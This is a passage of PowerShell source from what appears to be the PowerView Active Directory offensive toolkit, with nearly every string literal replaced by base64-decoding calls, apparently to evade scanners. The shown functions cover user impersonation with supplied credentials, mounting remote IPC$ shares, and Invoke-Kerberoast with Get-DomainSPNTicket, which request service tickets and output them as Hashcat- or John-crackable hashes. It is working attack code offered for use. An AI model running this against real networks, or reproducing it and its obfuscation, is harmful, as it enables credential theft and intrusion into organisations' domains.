        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0VSVkVSX1RSVVNUX0FDQ09VTlQ="))), 8192)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9FWFBJUkVfUEFTU1dPUkQ="))), 65536)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TU5TX0xPR09OX0FDQ09VTlQ="))), 131072)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U01BUlRDQVJEX1JFUVVJUkVE"))), 262144)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RFRF9GT1JfREVMRUdBVElPTg=="))), 524288)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX0RFTEVHQVRFRA=="))), 1048576)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVNFX0RFU19LRVlfT05MWQ=="))), 2097152)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9SRVFfUFJFQVVUSA=="))), 4194304)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dPUkRfRVhQSVJFRA=="))), 8388608)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RFRF9UT19BVVRIX0ZPUl9ERUxFR0FUSU9O"))), 16777216)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFSVElBTF9TRUNSRVRTX0FDQ09VTlQ="))), 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9Kw=="))) -f $($UACValue.Value)))
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($UACValue.Value)))
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($UACValue.Value)))
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] -or ($Identity -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r"))))) {
            if ($Identity -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r")))) {
                
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
                    $ObjectIdentity = $Identity.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJENvbm5lY3RUYXJnZXQ=")))
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJERvbWFpbg==")))
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHM=")))
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHM=")))
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGV4dA=="))) $Context
        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBFcnJvciBjcmVhdGluZyBiaW5kaW5nIGZvciBvYmplY3QgKCckSWRlbnRpdHknKSBjb250ZXh0IDogezB9"))) -f $_)
    }
}


function Add-RemoteConnection {


    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
                $Paths += ,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkVGFyZ2V0Q29tcHV0ZXJOYW1lXElQQyQ=")))
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1SZW1vdGVDb25uZWN0aW9uXSBBdHRlbXB0aW5nIHRvIG1vdW50OiAkVGFyZ2V0UGF0aA==")))

            
            
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRhcmdldFBhdGggc3VjY2Vzc2Z1bGx5IG1vdW50ZWQ=")))
            }
            else {
                Throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1SZW1vdGVDb25uZWN0aW9uXSBlcnJvciBtb3VudGluZyAkVGFyZ2V0UGF0aCA6IHswfQ=="))) -f $(([ComponentModel.Win32Exception]$Result).Message))
            }
        }
    }
}


function Remove-RemoteConnection {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
                $Paths += ,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkVGFyZ2V0Q29tcHV0ZXJOYW1lXElQQyQ=")))
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uXSBBdHRlbXB0aW5nIHRvIHVubW91bnQ6ICRUYXJnZXRQYXRo")))
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRhcmdldFBhdGggc3VjY2Vzc2Z1bGx5IHVtbW91bnRlZA==")))
            }
            else {
                Throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uXSBlcnJvciB1bm1vdW50aW5nICRUYXJnZXRQYXRoIDogezB9"))) -f $(([ComponentModel.Win32Exception]$Result).Message))
            }
        }
    }
}


function Invoke-UserImpersonation {


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1RB")))) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UXVpZXQ=")))])) {
        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gcG93ZXJzaGVsbC5leGUgaXMgbm90IGN1cnJlbnRseSBpbiBhIHNpbmdsZS10aHJlYWRlZCBhcGFydG1lbnQgc3RhdGUsIHRva2VuIGltcGVyc29uYXRpb24gbWF5IG5vdCB3b3JrLg==")))
    }

    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU=")))]) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gRXhlY3V0aW5nIExvZ29uVXNlcigpIHdpdGggdXNlcjogezB9XHsxfQ=="))) -f $($UserDomain), $($UserName))

        
        
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gTG9nb25Vc2VyKCkgRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
        }
    }

    
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoKSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
    }

    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gQWx0ZXJuYXRlIGNyZWRlbnRpYWxzIHN1Y2Nlc3NmdWxseSBpbXBlcnNvbmF0ZWQ=")))
    $LogonTokenHandle
}


function Invoke-RevertToSelf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU=")))]) {
        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydGluZyB0b2tlbiBpbXBlcnNvbmF0aW9uIGFuZCBjbG9zaW5nIExvZ29uVXNlcigpIHRva2VuIGhhbmRsZQ==")))
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydFRvU2VsZigpIEVycm9yOiB7MH0="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
    }

    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1SZXZlcnRUb1NlbGZdIFRva2VuIGltcGVyc29uYXRpb24gc3VjY2Vzc2Z1bGx5IHJldmVydGVk")))
}


function Get-DomainSPNTicket {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFzaGNhdA=="))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklkZW50aXR5TW9kZWw="))))

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))]) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))]) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
                $DistinguishedName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
            }

            
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TUE5UaWNrZXRdIEVycm9yIHJlcXVlc3RpbmcgdGlja2V0IGZvciBTUE4gJyRVc2VyU1BOJyBmcm9tIHVzZXIgJyREaXN0aW5ndWlzaGVkTmFtZScgOiB7MH0="))) -f $_)
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))

                $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FtQWNjb3VudE5hbWU="))) $SamAccountName
                $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzdGluZ3Vpc2hlZE5hbWU="))) $DistinguishedName
                $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVByaW5jaXBhbE5hbWU="))) $Ticket.ServicePrincipalName

                
                
                if($TicketHexStream -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YTM4Mi4uLi4zMDgyLi4uLkEwMDMwMjAxKD88RXR5cGVMZW4+Li4pQTEuezEsNH0uLi4uLi4uQTI4Mig/PENpcGhlclRleHRMZW4+Li4uLikuLi4uLi4uLig/PERhdGFUb0VuZD4uKyk=")))) {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QTQ4Mg==")))) {
                        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcGFyc2luZyBjaXBoZXJ0ZXh0IGZvciB0aGUgU1BOICB7MH0uIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVx"))) -f $($Ticket.ServicePrincipalName))
                        $Hash = $null
                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGlja2V0Qnl0ZUhleFN0cmVhbQ=="))) ([Bitconverter]::ToString($TicketByteStream).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ=="))),''))
                    } else {
                        $Hash = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9YCR7MX0="))) -f $($CipherText.Substring(0,32)), $($CipherText.Substring(32)))
                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGlja2V0Qnl0ZUhleFN0cmVhbQ=="))) $null
                    }
                } else {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHBhcnNlIHRpY2tldCBzdHJ1Y3R1cmUgZm9yIHRoZSBTUE4gIHswfS4gVXNlIHRoZSBUaWNrZXRCeXRlSGV4U3RyZWFtIGZpZWxkIGFuZCBleHRyYWN0IHRoZSBoYXNoIG9mZmxpbmUgd2l0aCBHZXQtS2VyYmVyb2FzdEhhc2hGcm9tQVBSZXE="))) -f $($Ticket.ServicePrincipalName))
                    $Hash = $null
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGlja2V0Qnl0ZUhleFN0cmVhbQ=="))) ([Bitconverter]::ToString($TicketByteStream).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ=="))),''))
                }

                if($Hash) {
                    
                    if ($OutputFormat -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Sm9obg==")))) {
                        $HashFormat = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YCRrcmI1dGdzYCR7MH06JEhhc2g="))) -f $($Ticket.ServicePrincipalName))
                    }
                    else {
                        if ($DistinguishedName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))) {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        }
                        else {
                            $UserDomain = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
                        }

                        
                        $HashFormat = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YCRrcmI1dGdzYCR7MH1gJCokU2FtQWNjb3VudE5hbWVgJCRVc2VyRG9tYWluYCR7MX0qYCQkSGFzaA=="))) -f $($Etype), $($Ticket.ServicePrincipalName))
                    }
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFzaA=="))) $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNQTlRpY2tldA=="))))
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFzaGNhdA=="))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsc2VydmljZXByaW5jaXBhbG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0")))} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg4MDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY1JlYWQ=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY1dyaXRl")))
